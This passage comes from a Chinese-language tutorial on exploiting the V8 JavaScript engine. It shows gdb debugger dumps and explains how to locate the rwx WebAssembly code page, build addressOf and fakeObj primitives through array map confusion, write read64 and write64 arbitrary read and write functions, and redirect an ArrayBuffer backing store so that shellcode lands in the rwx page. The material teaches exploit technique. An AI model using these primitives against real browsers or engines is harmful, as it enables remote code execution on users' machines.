+ - dependent code: 0x12f2080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+
+DebugPrint: 0x12f2081d3509: [WasmInstanceObject] in OldSpace
+ - map: 0x12f208207439 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x12f208048265 <Object map = 0x12f2082079b1>
+ - elements: 0x12f20800222d <FixedArray[0]> [HOLEY_ELEMENTS]
+ - module_object: 0x12f2080499f1 <Module map = 0x12f2082072d1>
+ - exports_object: 0x12f208049ba5 <Object map = 0x12f208207a79>
+ - native_context: 0x12f2081c3649 <NativeContext[256]>
+ - memory_object: 0x12f2081d34f1 <Memory map = 0x12f2082076e1>
+ - table 0: 0x12f208049b75 <Table map = 0x12f208207551>
+ - imported_function_refs: 0x12f20800222d <FixedArray[0]>
+ - indirect_function_table_refs: 0x12f20800222d <FixedArray[0]>
+ - managed_native_allocations: 0x12f208049b2d <Foreign>
+ - memory_start: 0x7f11e0000000
+ - memory_size: 65536
+ - memory_mask: ffff
+ - imported_function_targets: 0x55ce33e23180
+ - globals_start: (nil)
+ - imported_mutable_globals: 0x55ce33e231a0
+ - indirect_function_table_size: 0
+ - indirect_function_table_sig_ids: (nil)
+ - indirect_function_table_targets: (nil)
+ - properties: 0x12f20800222d <FixedArray[0]>
+ - All own properties (excluding elements): {}
+
+0x12f208207439: [Map]
+ - type: WASM_INSTANCE_OBJECT_TYPE
+ - instance size: 216
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x12f2080023b5 <undefined>
+ - prototype_validity cell: 0x12f208142405 <Cell value= 1>
+ - instance descriptors (own) #0: 0x12f2080021c1 <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
+ - prototype: 0x12f208048265 <Object map = 0x12f2082079b1>
+ - constructor: 0x12f2081d2691 <JSFunction Instance (sfi = 0x12f2081d266d)>
+ - dependent code: 0x12f2080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+
+
+Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x55ce33dfe130 --> 0x7fffa54f51c0 (0x000055ce33dfe130)
+RCX: 0x55ce32da53e0 (<Builtins_CallRuntimeHandler>:	push   rbp)
+RDX: 0x55ce33dfe130 --> 0x7fffa54f51c0 (0x000055ce33dfe130)
+RSI: 0x7fffa54f4150 --> 0x12f2080023b5 --> 0x80023 
+RDI: 0x0 
+RBP: 0x7fffa54f40b0 --> 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 (--> ...)
+RSP: 0x7fffa54f40b0 --> 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 (--> ...)
+RIP: 0x55ce32e30445 (<_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp)
+R8 : 0x12f2081c3649 --> 0xd900000200082021 
+R9 : 0x96 
+R10: 0x0 
+R11: 0xfffffffffffffffa 
+R12: 0x55ce33e95670 --> 0x12f208206fb1 --> 0xbd11050505080021 
+R13: 0x55ce33dfe130 --> 0x7fffa54f51c0 (0x000055ce33dfe130)
+R14: 0x12f200000000 --> 0x15000 
+R15: 0x55ce33e97170 --> 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x55ce32e30440 <_ZN2v84base2OS10DebugBreakEv>:	push   rbp
+   0x55ce32e30441 <_ZN2v84base2OS10DebugBreakEv+1>:	mov    rbp,rsp
+   0x55ce32e30444 <_ZN2v84base2OS10DebugBreakEv+4>:	int3   
+=> 0x55ce32e30445 <_ZN2v84base2OS10DebugBreakEv+5>:	pop    rbp
+   0x55ce32e30446 <_ZN2v84base2OS10DebugBreakEv+6>:	ret    
+   0x55ce32e30447:	int3   
+   0x55ce32e30448:	int3   
+   0x55ce32e30449:	int3
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffa54f40b0 --> 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 (--> ...)
+0008| 0x7fffa54f40b8 --> 0x55ce3274d4b5 (<_ZN2v88internal19Runtime_SystemBreakEiPmPNS0_7IsolateE+53>:	mov    r14,QWORD PTR [rbx+0xa0])
+0016| 0x7fffa54f40c0 --> 0x55ce3274d480 (<_ZN2v88internal19Runtime_SystemBreakEiPmPNS0_7IsolateE>:	push   rbp)
+0024| 0x7fffa54f40c8 --> 0x0 
+0032| 0x7fffa54f40d0 --> 0x12f200000000 --> 0x15000 
+0040| 0x7fffa54f40d8 --> 0x7fffa54f4150 --> 0x12f2080023b5 --> 0x80023 
+0048| 0x7fffa54f40e0 --> 0x7fffa54f4108 --> 0x7fffa54f4128 --> 0x7fffa54f4180 --> 0x7fffa54f41a8 --> 0x7fffa54f4210 (--> ...)
+0056| 0x7fffa54f40e8 --> 0x55ce32d14db3 (<Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit+51>:	cmp    eax,DWORD PTR [r13+0x180])
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGTRAP
+0x000055ce32e30445 in v8::base::OS::DebugBreak() ()
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00000fa09aef3000 0x00000fa09aef4000 rwxp	mapped
+0x000012f200000000 0x000012f200003000 rw-p	mapped
+0x000012f200003000 0x000012f200004000 ---p	mapped
+0x000012f200004000 0x000012f200014000 r-xp	mapped
+0x000012f200014000 0x000012f20003f000 ---p	mapped
+0x000012f20003f000 0x000012f208000000 ---p	mapped
+0x000012f208000000 0x000012f208021000 r--p	mapped
+0x000012f208021000 0x000012f208040000 ---p	mapped
+0x000012f208040000 0x000012f20814d000 rw-p	mapped
+0x000012f20814d000 0x000012f208180000 ---p	mapped
+0x000012f208180000 0x000012f208183000 rw-p	mapped
+0x000012f208183000 0x000012f2081c0000 ---p	mapped
+0x000012f2081c0000 0x000012f208240000 rw-p	mapped
+0x000012f208240000 0x000012f300000000 ---p	mapped
+0x000055ce3193d000 0x000055ce321a5000 r--p	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce321a5000 0x000055ce32fb5000 r-xp	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce32fb5000 0x000055ce3301d000 r--p	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce3301d000 0x000055ce3302e000 rw-p	/home/yqw/Documents/v8/v8/out/x64_9.3.345.16.release/d8
+0x000055ce3302e000 0x000055ce33058000 rw-p	mapped
+0x000055ce33df8000 0x000055ce33ed5000 rw-p	[heap]
+0x00007f1160000000 0x00007f11e0000000 ---p	mapped
+0x00007f11e0000000 0x00007f11e0010000 rw-p	mapped
+0x00007f11e0010000 0x00007f13e0000000 ---p	mapped
+0x00007f13e0000000 0x00007f13e0021000 rw-p	mapped
+0x00007f13e0021000 0x00007f13e4000000 ---p	mapped
+0x00007f13e5648000 0x00007f13e5649000 ---p	mapped
+0x00007f13e5649000 0x00007f13e6800000 rw-p	mapped
+0x00007f13e6800000 0x00007f13e6828000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6828000 0x00007f13e69bd000 r-xp	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e69bd000 0x00007f13e6a15000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6a15000 0x00007f13e6a19000 r--p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6a19000 0x00007f13e6a1b000 rw-p	/usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007f13e6a1b000 0x00007f13e6a28000 rw-p	mapped
+0x00007f13e6aa3000 0x00007f13e6aa7000 rw-p	mapped
+0x00007f13e6aa7000 0x00007f13e6aaa000 r--p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6aaa000 0x00007f13e6ac1000 r-xp	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac1000 0x00007f13e6ac5000 r--p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac5000 0x00007f13e6ac6000 r--p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac6000 0x00007f13e6ac7000 rw-p	/usr/lib/x86_64-linux-gnu/libgcc_s.so.1
+0x00007f13e6ac7000 0x00007f13e6ad5000 r--p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6ad5000 0x00007f13e6b51000 r-xp	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6b51000 0x00007f13e6bac000 r--p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6bac000 0x00007f13e6bad000 r--p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6bad000 0x00007f13e6bae000 rw-p	/usr/lib/x86_64-linux-gnu/libm.so.6
+0x00007f13e6bae000 0x00007f13e6baf000 r--p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6baf000 0x00007f13e6bb0000 r-xp	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb0000 0x00007f13e6bb1000 r--p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb1000 0x00007f13e6bb2000 r--p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb2000 0x00007f13e6bb3000 rw-p	/usr/lib/x86_64-linux-gnu/libpthread.so.0
+0x00007f13e6bb3000 0x00007f13e6bb4000 r--p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb4000 0x00007f13e6bb5000 r-xp	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb5000 0x00007f13e6bb6000 r--p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb6000 0x00007f13e6bb7000 r--p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bb7000 0x00007f13e6bb8000 rw-p	/usr/lib/x86_64-linux-gnu/libdl.so.2
+0x00007f13e6bc7000 0x00007f13e6bc9000 rw-p	mapped
+0x00007f13e6bc9000 0x00007f13e6bcb000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6bcb000 0x00007f13e6bf5000 r-xp	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6bf5000 0x00007f13e6c00000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6c01000 0x00007f13e6c03000 r--p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007f13e6c03000 0x00007f13e6c05000 rw-p	/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+0x00007fffa54d7000 0x00007fffa54f8000 rw-p	[stack]
+0x00007fffa5589000 0x00007fffa558d000 r--p	[vvar]
+0x00007fffa558d000 0x00007fffa558f000 r-xp	[vdso]
+0xffffffffff600000 0xffffffffff601000 --xp	[vsyscall]
+```
+
+因为WASM代码的创建，内存中出现可rwx的内存段。接下来的问题就是，我们怎么获取到改地址呢？
+
+首先我们来看看变量`f`的信息：
+
+```assembly
+DebugPrint: 0x12f2081d3645: [Function] in OldSpace
+ - map: 0x12f2082049e1 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x12f2081c3b5d <JSFunction (sfi = 0x12f20814414d)>
+ - elements: 0x12f20800222d <FixedArray[0]> [HOLEY_ELEMENTS]
+ - function prototype: <no-prototype-slot>
+ - shared_info: 0x12f2081d3621 <SharedFunctionInfo js-to-wasm::i>
+ - name: 0x12f2080051c5 <String[1]: #0>
+ - builtin: GenericJSToWasmWrapper
+ - formal_parameter_count: 0
+ - kind: NormalFunction
+ - context: 0x12f2081c3649 <NativeContext[256]>
+ - code: 0x12f20000b3a1 <Code BUILTIN GenericJSToWasmWrapper>
+ - Wasm instance: 0x12f2081d3509 <Instance map = 0x12f208207439>
+ - Wasm function index: 0
+ - properties: 0x12f20800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x12f208004905: [String] in ReadOnlySpace: #length: 0x12f208142339 <AccessorInfo> (const accessor descriptor), location: descriptor
+    0x12f208004a35: [String] in ReadOnlySpace: #name: 0x12f2081422f5 <AccessorInfo> (const accessor descriptor), location: descriptor
+    0x12f208004029: [String] in ReadOnlySpace: #arguments: 0x12f20814226d <AccessorInfo> (const accessor descriptor), location: descriptor
+    0x12f208004245: [String] in ReadOnlySpace: #caller: 0x12f2081422b1 <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - feedback vector: feedback metadata is not available in SFI
+0x12f2082049e1: [Map]
+ - type: JS_FUNCTION_TYPE
+ - instance size: 28
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - callable
+ - back pointer: 0x12f2080023b5 <undefined>
+ - prototype_validity cell: 0x12f208142405 <Cell value= 1>
+ - instance descriptors (own) #4: 0x12f2081d0735 <DescriptorArray[4]>
+ - prototype: 0x12f2081c3b5d <JSFunction (sfi = 0x12f20814414d)>
+ - constructor: 0x12f208002235 <null>
+ - dependent code: 0x12f2080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+```
+
+可以发现这是一个函数对象，我们来查看一下`f`的`shared_info`结构的信息：
+
+```assembly
+gdb-peda$ job 0x12f2081d3621
+0x12f2081d3621: [SharedFunctionInfo] in OldSpace
+ - map: 0x12f2080025f9 <Map[36]>
+ - name: 0x12f2080051c5 <String[1]: #0>
+ - kind: NormalFunction
+ - syntax kind: AnonymousExpression
+ - function_map_index: 185
+ - formal_parameter_count: 0
+ - expected_nof_properties: 
+ - language_mode: sloppy
+ - data: 0x12f2081d35f5 <Other heap object (WASM_EXPORTED_FUNCTION_DATA_TYPE)>
+ - code (from data): 0x12f20000b3a1 <Code BUILTIN GenericJSToWasmWrapper>
+ - script: 0x12f2081d3491 <Script>
+ - function token position: 88
+ - start position: 88
+ - end position: 92
+ - no debug info
+ - scope info: 0x12f208002739 <ScopeInfo>
+ - length: 0
+ - feedback_metadata: <none>
+```
+
+接下里再查看其`data`结构：
+
+```assembly
+gdb-peda$ job 0x12f2081d35f5
+0x12f2081d35f5: [WasmExportedFunctionData] in OldSpace
+ - map: 0x12f208002e7d <Map[44]>
+ - target: 0xfa09aef3000
+ - ref: 0x12f2081d3509 <Instance map = 0x12f208207439>
+ - wrapper_code: 0x12f20000b3a1 <Code BUILTIN GenericJSToWasmWrapper>
+ - instance: 0x12f2081d3509 <Instance map = 0x12f208207439>
+ - function_index: 0
+ - signature: 0x12f208049bdd <Foreign>
+ - wrapper_budget: 1000
+```
+
+再查看`instance`结构：
+
+```assembly
+gdb-peda$ job 0x12f2081d3509
+0x12f2081d3509: [WasmInstanceObject] in OldSpace
+ - map: 0x12f208207439 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x12f208048265 <Object map = 0x12f2082079b1>
+ - elements: 0x12f20800222d <FixedArray[0]> [HOLEY_ELEMENTS]
+ - module_object: 0x12f2080499f1 <Module map = 0x12f2082072d1>
+ - exports_object: 0x12f208049ba5 <Object map = 0x12f208207a79>
+ - native_context: 0x12f2081c3649 <NativeContext[256]>
+ - memory_object: 0x12f2081d34f1 <Memory map = 0x12f2082076e1>
+ - table 0: 0x12f208049b75 <Table map = 0x12f208207551>
+ - imported_function_refs: 0x12f20800222d <FixedArray[0]>
+ - indirect_function_table_refs: 0x12f20800222d <FixedArray[0]>
+ - managed_native_allocations: 0x12f208049b2d <Foreign>
+ - memory_start: 0x7f11e0000000
+ - memory_size: 65536
+ - memory_mask: ffff
+ - imported_function_targets: 0x55ce33e23180
+ - globals_start: (nil)
+ - imported_mutable_globals: 0x55ce33e231a0
+ - indirect_function_table_size: 0
+ - indirect_function_table_sig_ids: (nil)
+ - indirect_function_table_targets: (nil)
+ - properties: 0x12f20800222d <FixedArray[0]>
+ - All own properties (excluding elements): {}
+```
+
+仔细查看能发现，`instance`结构就是js代码中的`wasmInstance`变量的地址，在代码中我们加入了`%DebugPrint(wasmInstance);`，所以也会输出该结构的信息，可以去对照看看。
+
+我们再来查看这个结构的内存布局：
+
+```assembly
+gdb-peda$ x/16gx 0x12f2081d3509-1
+0x12f2081d3508:	0x0800222d08207439	0xe00000000800222d
+0x12f2081d3518:	0x0001000000007f11	0x0000ffff00000000
+0x12f2081d3528:	0x33dfe19000000000	0x0800222d000055ce
+0x12f2081d3538:	0x000055ce33e23180	0x000000000800222d
+0x12f2081d3548:	0x0000000000000000	0x0000000000000000
+0x12f2081d3558:	0x0000000000000000	0x000055ce33e231a0
+0x12f2081d3568:	0x000055ce33dfe130	0x00000fa09aef3000
+0x12f2081d3578:	0x08049ba5080499f1	0x081d34f1081c3649
+```
+
+仔细看，能发现，rwx段的起始地址储存在`instance+0x68`的位置，不过这个不用记，不同版本，这个偏移值可能会有差距，可以在写exp的时候通过上述调试的方式进行查找。
+
+根据WASM的特性，我们的目的可以更细化了，现在我们的目的变为了把`shellcode`写到WASM的代码段，然后执行WASM函数，那么就能执行`shellcode`了。
+
+## 任意读写
+
+首先来看看JavaScript的两种类型的变量的结构：
+
+```assembly
+$ cat test.js
+a = [2.1];
+b = {"a": 1};
+c = [b];
+%DebugPrint(a);
+%DebugPrint(b);
+%DebugPrint(c);
+%SystemBreak();
+```
+
+首先是变量`a`的结构：
+
+```assembly
+DebugPrint: 0x20f7080496d9: [JSArray]
+ - map: 0x20f708203ae1 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
+ - prototype: 0x20f7081cc139 <JSArray[0]>
+ - elements: 0x20f7080496c9 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
+ - length: 1
+ - properties: 0x20f70800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x20f708004905: [String] in ReadOnlySpace: #length: 0x20f70814215d <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - elements: 0x20f7080496c9 <FixedDoubleArray[1]> {
+           0: 2.1
+ }
+0x20f708203ae1: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_DOUBLE_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x20f708203ab9 <Map(HOLEY_SMI_ELEMENTS)>
+ - prototype_validity cell: 0x20f708142405 <Cell value= 1>
+ - instance descriptors #1: 0x20f7081cc5ed <DescriptorArray[1]>
+ - transitions #1: 0x20f7081cc639 <TransitionArray[4]>Transition array #1:
+     0x20f708005245 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x20f708203b09 <Map(HOLEY_DOUBLE_ELEMENTS)>
+
+ - prototype: 0x20f7081cc139 <JSArray[0]>
+ - constructor: 0x20f7081cbed5 <JSFunction Array (sfi = 0x20f70814ad71)>
+ - dependent code: 0x20f7080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+gdb-peda$ job 0x20f7080496c9
+0x20f7080496c9: [FixedDoubleArray]
+ - map: 0x20f708002a95 <Map>
+ - length: 1
+           0: 2.1
+gdb-peda$ x/8gx 0x20f7080496d9-1
+0x20f7080496d8:	0x0800222d08203ae1	0x00000002080496c9
+0x20f7080496e8:	0x0800222d08207961	0x000000020800222d
+0x20f7080496f8:	0x0001000108005c31	0x080021f900000000
+0x20f708049708:	0x0000008808007aad	0x0800220500000002
+gdb-peda$ x/8gx 0x20f7080496c9-1
+0x20f7080496c8:	0x0000000208002a95	0x4000cccccccccccd
+0x20f7080496d8:	0x0800222d08203ae1	0x00000002080496c9
+0x20f7080496e8:	0x0800222d08207961	0x000000020800222d
+0x20f7080496f8:	0x0001000108005c31	0x080021f900000000
+```
+
+变量`a`的结构如下：
+
+```assembly
+| 32 bit map addr | 32 bit properties addr | 32 bit elements addr | 32 bit length|
+```
+
+因为在当前版本的v8中，对地址进行了压缩，因为高32bit地址的值是一样的，所以只需要保存低32bit的地址就行了。
+
+`elements`结构保存了数组的值，结构为：
+
+```assembly
+| 32 bit map addr | 32 bit length | value ......
+```
+
+变量`a`结构中的`length`，表示的是当前数组的已经使用的长度，`elements`表示该数组已经申请的长度，申请了不代表已经使用了。**这两个长度在内存中储存的值为实际值的2倍，为啥这么设计，暂时还没了解。**
+
+仔细研究上面的内存布局，能发现，`elements`结构之后是紧跟着变量`a`的结构。很多洞都是这个时候让变量`a`溢出，然后这样就可以读写其结构的map和length的值。
+
+变量`b`的结构：
+
+```assembly
+DebugPrint: 0x20f7080496e9: [JS_OBJECT_TYPE]
+ - map: 0x20f708207961 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x20f7081c4205 <Object map = 0x20f7082021b9>
+ - elements: 0x20f70800222d <FixedArray[0]> [HOLEY_ELEMENTS]
+ - properties: 0x20f70800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x20f708007aad: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
+ }
+0x20f708207961: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 16
+ - inobject properties: 1
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x20f708207939 <Map(HOLEY_ELEMENTS)>
+ - prototype_validity cell: 0x20f708142405 <Cell value= 1>
+ - instance descriptors (own) #1: 0x20f7080496f9 <DescriptorArray[1]>
+ - prototype: 0x20f7081c4205 <Object map = 0x20f7082021b9>
+ - constructor: 0x20f7081c3e3d <JSFunction Object (sfi = 0x20f708144735)>
+ - dependent code: 0x20f7080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+```
+
+变量`c`的结构：
+
+```assembly
+DebugPrint: 0x20f708049721: [JSArray]
+ - map: 0x20f708203b31 <Map(PACKED_ELEMENTS)> [FastProperties]
+ - prototype: 0x20f7081cc139 <JSArray[0]>
+ - elements: 0x20f708049715 <FixedArray[1]> [PACKED_ELEMENTS]
+ - length: 1
+ - properties: 0x20f70800222d <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0x20f708004905: [String] in ReadOnlySpace: #length: 0x20f70814215d <AccessorInfo> (const accessor descriptor), location: descriptor
+ }
+ - elements: 0x20f708049715 <FixedArray[1]> {
+           0: 0x20f7080496e9 <Object map = 0x20f708207961>
+ }
+0x20f708203b31: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x20f708203b09 <Map(HOLEY_DOUBLE_ELEMENTS)>
+ - prototype_validity cell: 0x20f708142405 <Cell value= 1>
+ - instance descriptors #1: 0x20f7081cc5ed <DescriptorArray[1]>
+ - transitions #1: 0x20f7081cc669 <TransitionArray[4]>Transition array #1:
+     0x20f708005245 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x20f708203b59 <Map(HOLEY_ELEMENTS)>
+
+ - prototype: 0x20f7081cc139 <JSArray[0]>
+ - constructor: 0x20f7081cbed5 <JSFunction Array (sfi = 0x20f70814ad71)>
+ - dependent code: 0x20f7080021b9 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
+ - construction counter: 0
+gdb-peda$ job 0x20f708049715
+0x20f708049715: [FixedArray]
+ - map: 0x20f708002205 <Map>
+ - length: 1
+           0: 0x20f7080496e9 <Object map = 0x20f708207961>
+gdb-peda$ x/8gx 0x20f708049721-1
+0x20f708049720:	0x0800222d08203b31	0x0000000208049715
+0x20f708049730:	0x0000000000000000	0x0000000000000000
+0x20f708049740:	0x0000000000000000	0x0000000000000000
+0x20f708049750:	0x0000000000000000	0x0000000000000000
+gdb-peda$ x/8gx 0x20f708049715-1
+0x20f708049714:	0x0000000208002205	0x08203b31080496e9
+0x20f708049724:	0x080497150800222d	0x0000000000000002
+0x20f708049734:	0x0000000000000000	0x0000000000000000
+0x20f708049744:	0x0000000000000000	0x0000000000000000
+```
+
+变量`c`的结构和变量`a`的基本上是一样的，只是变量`a`储存的是`double`类型的变量，所以value都是64bit的，而变量`c`储存的是对象类型的变量，储存的是地址，也对地址进行了压缩，所以长度是32bit。
+
+### 任意变量地址读
+
+既然内存结构这么一致，那么使用`a[0]`或者`c[0]`取值的时候，js是怎么判断结构类型的呢？通过看代码，或者gdb实际测试都能发现，是根据变量结构的map值来确定的。
+
+也就是说如果我把变量`c`的map地址改成变量`a`的，那么当我执行`c[0]`的时候，获取到的就是变量`b`的地址了。这样，就能达到任意变量地址读的效果，步骤如下：
+
+1. 把`c[0]`的值设置为你想获取地址的变量，比如`c[0]=a;`。
+2. 然后通过漏洞，把`c`的map地址修改成`a`的map地址。
+3. 读取`c[0]`的值，该值就为变量`a`的低32bit地址。
+
+在本文说的套路中，上述步骤被封装为`addressOf`函数。
+
+该逻辑还达不到任意地址读的效果，所以还需要继续研究。
+
+### double to object
+
+既然我们可以把对象数组变为浮点型数组，那么是不是也可以把浮点型数组变为对象数组，步骤如下：
+
+1. 把`a[0]`的值设置为自己构造的某个对象的地址还需要加1。
+2. 然后通过漏洞，把`a`的map地址修改成`c`的map地址。
+3. 获取`a[0]`的值
+
+这个过程可以封装为`fakeObj`函数。
+
+### 任意读
+
+这个时候我们构造这样一个变量：
+
+```assembly
+var fake_array = [
+  double_array_map,
+  itof(0x4141414141414141n)
+];
+```
+
+该变量的结构大致如下：
+
+```assembly
+| 32 bit elements map | 32 bit length | 64 bit double_array_map |
+| 64 bit 0x4141414141414141n | 32 bit fake_array map | 32 bit properties |
+| 32 bit elements | 32 bit length|
+```
+
+根据分析，理论上来说布局应该如上所示，但是会根据漏洞不同，导致堆布局不同，所以导致`elements`地址的不同，具体情况，可以写exp的时候根据通过调试来判断。
+
+所以我可以使用`addressOf`获取`fake_array`地址：`var fake_array_addr = addressOf(fake_array);`。
+
+计算得到`fake_object_addr = fake_array_addr - 0x10n;`，然后使用`fakeObj`函数，得到你构造的对象：`var fake_object = fakeObj(fake_object_addr);`
+
+这个时候不要去查看`fake_object`的内容，因为其`length`字段和`elements`字段都被设置为了无效值(0x41414141)。
+
+这个时候我们就能通过`fake_array`数组来达到任意读的目的了，下面就是一个通用的任意读函数`read64`：
+
+```assembly
+function read64(addr)
+{
+    fake_array[1] = itof(addr - 0x8n + 0x1n);
+    return fake_object[0];
+}
+```
+
+### 任意写
+
+同理，也能构造出任意写`write64`：
+
+```assembly
+function write64(addr, data)
+{
+    fake_array[1] = itof(addr - 0x8n + 0x1n);
+    fake_object[0] = itof(data);
+}
+```
+
+我们可以这么理解上述过程，`fakeObj`对象相当于把把浮点数数组变量`a`改成了二维浮点数数组：`a = [[1.1]]`，而`fake_array[1]`值的内存区域属于`fake_object`对象的`elements`和`length`字段的位置，所以我们可以通过修改`fake_array[1]`的值，来控制`fake_object`，以达到任意读写的效果。
+
+### 写shellcode
+
+不过上述的任意写却没办法把我们的`shellcode`写到rwx区域，因为`写入的地址=实际地址-0x8+0x1`，前面还需要有8字节的map地址和length，而rwx区域根据我们调试的时候看到的内存布局，需要从该内存段的起始地址开始写，所以`该地址-0x8+0x1`是一个无效地址。
+
+所以需要另辟蹊径，来看看下面的代码：
+
+```assembly
+$ cat test.js
+var data_buf = new ArrayBuffer(0x10);
+var data_view = new DataView(data_buf);
+data_view.setFloat64(0, 2.0, true);
+
+%DebugPrint(data_buf);
+%DebugPrint(data_view);
+%SystemBreak();
+```
+
+首先看看`data_buf`变量的结构：
+
+```assembly
+DebugPrint: 0x2ead0804970d: [JSArrayBuffer]
+ - map: 0x2ead08203271 <Map(HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x2ead081ca3a5 <Object map = 0x2ead08203299>
+ - elements: 0x2ead0800222d <FixedArray[0]> [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x555c12bb9050
+ - byte_length: 16
+ - detachable
+ - properties: 0x2ead0800222d <FixedArray[0]>
+ - All own properties (excluding elements): {}
+ - embedder fields = {
+    0, aligned pointer: (nil)
+    0, aligned pointer: (nil)
+ }
+```
+
+再来看看`backing_store`字段的内存：
+
+```assembly
+pwndbg> x/8gx 0x555c12bb9050
+0x555c12bb9050: 0x4000000000000000 0x0000000000000000
+0x555c12bb9060: 0x0000000000000000 0x0000000000000041
+0x555c12bb9070: 0x0000555c12bb9050 0x0000000000000010
+0x555c12bb9080: 0x0000000000000010 0x00007ffd653318a8
+```
+
+`double`型的2.0以十六进制表示就是`0x4000000000000000`，所以可以看出`data_buf`变量的值存储在一段连续的内存区域中，通过`backing_store`指针指向该内存区域。
+
+所以我们可以利用该类型，通过修改`backing_store`字段的值为rwx内存地址，来达到写`shellcode`的目的。
+
+看看`backing_store`字段在`data_buf`变量结构中的位置：
+
+```assembly
+pwndbg> x/16gx 0x2ead0804970d-1
+0x2ead0804970c: 0x0800222d08203271 0x000000100800222d
+0x2ead0804971c: 0x0000000000000000 0x12bb905000000000
+0x2ead0804972c: 0x12bb90b00000555c 0x000000020000555c
+0x2ead0804973c: 0x0000000000000000 0x0000000000000000
+0x2ead0804974c: 0x0800222d08202ca9 0x0804970d0800222d
+0x2ead0804975c: 0x0000000000000000 0x0000000000000010
